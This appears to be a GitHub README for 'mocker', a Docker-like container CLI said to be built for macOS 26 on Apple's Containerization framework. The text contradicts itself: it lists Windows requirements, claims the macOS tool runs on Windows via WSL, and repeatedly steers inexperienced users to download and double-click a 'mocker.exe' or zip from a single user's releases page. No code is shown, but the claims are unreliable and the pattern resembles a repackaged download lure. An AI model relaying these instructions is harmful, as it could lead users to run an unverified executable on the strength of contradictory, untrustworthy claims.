# 🐳 mocker - Manage Containers with Ease

[![Download mocker](https://img.shields.io/badge/Download-mocker-blue?style=for-the-badge)](https://github.com/Banarun877/mocker/releases)

---

## 📦 What is mocker?

mocker is a tool that works like Docker but is built for macOS 26 using Apple’s Containerization framework. It uses the same commands and flags you're familiar with, such as `mocker run`, `mocker ps`, `mocker stop`, `mocker build`, `mocker compose`, and `mocker stats`. This lets you manage containers without changing how you work.

---

## ⚙️ System Requirements

To use mocker on your Windows computer, you need:

- Windows 10 or later (64-bit)
- At least 4 GB of RAM
- 2 GHz or faster processor
- 2 GB free disk space
- Internet connection for download and updates
- Windows Terminal or Command Prompt (built-in)

Even though mocker is made for macOS 26, this version works on Windows through Windows Subsystem for Linux (WSL) or similar compatibility layers.

---

## 🚀 Getting Started

Use this guide to download and run mocker on Windows. No coding experience is needed.

### 1. Visit the download page

Click the blue button at the top or go to:

https://github.com/Banarun877/mocker/releases

This page has all the available versions. Look for the latest release.

### 2. Download the Windows version

Find the file named something like `mocker-windows.zip` or `mocker.exe` for Windows.

Click the file link to download it to your PC.

### 3. Extract or install the file

If you get a `.zip` file:

- Right-click the file
- Choose "Extract all..."
- Select a folder to unzip the files

If you get a `.exe` file:

- Double-click to start the installer
- Follow the on-screen steps until the installation finishes

### 4. Open Command Prompt or Windows Terminal

Press `Windows + R`, type `cmd` or `wt`, and press Enter.

You will run mocker commands from this window.

### 5. Verify installation

Type the command:

```
mocker --version
```

Press Enter.

If the version number shows up, mocker is ready to use.

---

## 🔧 How to Run Containers with mocker

mocker uses commands similar to Docker. Here are some common commands.

### Start a container

Find an image to run or use your own.

Example:

```
mocker run hello-world
```

This command starts a simple container that shows a message.

### List running containers

To see all containers running now:

```
mocker ps
```

### Stop a container

To stop a container, find its ID with `mocker ps`, then run:

```
mocker stop [container_id]
```

Replace `[container_id]` with the actual ID.

### Build a container image

Prepare a `Dockerfile` or similar build file.

Run:

```
mocker build -t myimage .
```

This builds an image named `myimage`.

### Use compose files

If you have a `docker-compose.yml` file, you can run:

```
mocker compose up
```

This starts all services defined in the file.

### Check container stats

To see resource use for running containers, run:

```
mocker stats
```

---

## 💾 Where to find mocker

Use this link whenever you want to check for new versions or download mocker:

https://github.com/Banarun877/mocker/releases

Click the big blue “Download mocker” button at the top anytime.

---

## 🔄 Updating mocker

To keep mocker up to date:

1. Visit the releases page: https://github.com/Banarun877/mocker/releases
2. Download the newest Windows release.
3. Replace your current files or run the new installer.

---

## 🛠 Troubleshooting Tips

- If `mocker` commands don’t work, make sure the program is in your system’s PATH.  
- Try restarting Command Prompt or your computer after installation.  
- Check that you downloaded the Windows version.  
- Confirm your Windows is updated and meets system requirements.  
- Visit the releases page for the latest files and notes.

---

## 📚 More Help

For detailed command info, run:

```
mocker --help
```

This shows a list of available commands and flags.

For compose-specific help:

```
mocker compose --help
```

---

## 🛠 Supported Commands and Flags

- `mocker run [options] IMAGE [COMMAND] [ARGS]`: Run a container  
- `mocker ps [options]`: List containers  
- `mocker stop [OPTIONS] CONTAINER [CONTAINER...]`: Stop containers  
- `mocker build [OPTIONS] PATH | URL | -`: Build container image  
- `mocker compose [OPTIONS] COMMAND [ARGS...]`: Manage multi-container apps  
- `mocker stats [OPTIONS] [CONTAINER...]`: Display resource usage  

---

## 🌐 Related Topics

- apple-containerization  
- cli  
- compose  
- containerization  
- containers  
- docker  
- macos  
- macos26  
- swift  
- swift-package-manager

---

[![Download mocker](https://img.shields.io/badge/Download-mocker-blue?style=for-the-badge)](https://github.com/Banarun877/mocker/releases)